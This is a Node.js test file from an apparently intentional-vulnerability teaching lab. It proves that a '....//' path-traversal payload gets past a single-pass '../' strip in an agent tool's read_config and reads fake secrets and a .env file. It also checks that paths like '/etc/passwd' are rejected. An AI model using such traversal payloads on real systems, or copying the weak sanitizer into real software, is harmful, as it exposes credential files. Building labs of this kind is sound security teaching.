/**
 * @intentional-vulnerability path-traversal-read-config
 * @teaches OWASP-Web:A01
 * @intentional-vulnerability mcp06-credential-leak
 * @teaches OWASP-MCP:MCP-01
 * @location agent-host/agents/system/tools/index.js
 *
 * read_config strips `../` in a single pass. Payload `....//platform_secrets.json`
 * becomes `../platform_secrets.json` after the single-pass strip, then
 * `path.resolve(BASE, '../platform_secrets.json')` walks outside of BASE
 * and reads the file. Also proves MCP-06 credential leak because the fake
 * platform_secrets.json contains DV-AI{admin_secret_M4} + AWS_key material.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const fs = require('node:fs');

test('path-traversal-read-config: ....// bypass leaks platform_secrets.json + .env content', t => {
  for (const k of Object.keys(require.cache)) {
    if (k.includes('/agent-host/agents/system/')) delete require.cache[k];
  }
  const fixture = require('../../fixtures/syntheticSystemConfig')();
  t.after(() => fixture.close());
  const { read_config, BASE } = fixture;

  // The traversal payload — the sanitizer strips ONE occurrence of `../`
  // from `....//`, leaving `../`. Resolved against BASE=server/, that walks
  // up one level then finds `server/platform_secrets.json`... which is
  // actually inside BASE, so we need a payload that escapes BASE.
  // BASE = <repo>/server. `....//platform_secrets.json` after single strip
  // → `../platform_secrets.json` → repo-root/platform_secrets.json (not
  // what we want). We wrote the fake file at server/platform_secrets.json
  // so we can escape ANY intermediate dir. Use `....//` to escape into
  // repo root then re-enter `server/`: `....//server/platform_secrets.json`.
  const payload = '....//server/platform_secrets.json';
  const r = read_config({ path: payload });
  assert.equal(r.ok, true, 'file was read successfully');
  assert.equal(r.sanitized, '../server/platform_secrets.json',
    'single-pass strip yields "../" — the bypass');
  assert.ok(r.abs.endsWith('platform_secrets.json'), 'resolved path escapes BASE and hits the fake secrets file');
  assert.ok(r.content.includes('DV-AI{admin_secret_M4}'),
    'DV-AI marker exfiltrated (proof MCP-06 credential leak surface is real)');
  assert.ok(r.content.includes('AKIA_FAKE_XXXXXXXX'),
    'fake AWS key exfiltrated');

  // Additionally: try to read the repo-root .env if present (skip cleanly if not).
  const repoEnvPath = path.resolve(BASE, '../.env');
  assert.ok(fs.existsSync(repoEnvPath), 'synthetic .env fixture must exist');
  {
    const envRead = read_config({ path: '....//.env' });
    assert.equal(envRead.ok, true, '.env reachable via traversal');
    assert.ok(envRead.abs.endsWith('.env'));
  }
});

test('path-traversal-read-config: F7 — absolute paths are REJECTED (extra unintended primitive closed)', () => {
  for (const k of Object.keys(require.cache)) {
    if (k.includes('/agent-host/agents/system/')) delete require.cache[k];
  }
  const { read_config } = require(path.resolve(__dirname, '../../../../agent-host/agents/system/tools/index.js'));

  // Wave 4C flagged that in addition to the annotated ....// bypass, the tool
  // used to accept absolute paths like `/etc/passwd` which skip the strip
  // regex entirely and are resolved directly by path.resolve. That's a
  // SECOND, unintentional primitive. F7 closes it while keeping ....//.
  const r = read_config({ path: '/etc/passwd' });
  assert.equal(r.ok, false, 'absolute paths must be rejected');
  assert.match(r.error, /absolute/i);

  const r2 = read_config({ path: '\\\\server\\share\\secret.txt' });
  assert.equal(r2.ok, false, 'UNC paths must be rejected');

  const r3 = read_config({ path: 'C:\\Windows\\notepad.exe' });
  assert.equal(r3.ok, false, 'windows drive absolute paths must be rejected');
});
